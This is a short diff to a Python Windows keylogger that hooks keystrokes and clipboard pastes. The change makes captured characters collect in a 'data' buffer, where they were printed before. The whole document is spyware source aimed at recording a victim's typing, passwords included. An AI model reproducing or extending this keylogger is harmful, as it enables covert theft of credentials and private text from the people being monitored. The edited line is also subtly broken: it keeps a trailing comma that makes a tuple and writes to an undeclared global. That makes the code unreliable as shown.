@@ -8,7 +8,7 @@ kernel32 = windll.kernel32
 psapi    = windll.psapi
 current_window = None
 
-data = ""
+data = "Begin: "
 
 
 def get_current_process():
@@ -53,7 +53,7 @@ def KeyStroke(event):
         
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
+        data += chr(event.Ascii),
     else:
         # if Ctrl-V, get the value on the clipboard
         if event.Key == "V":
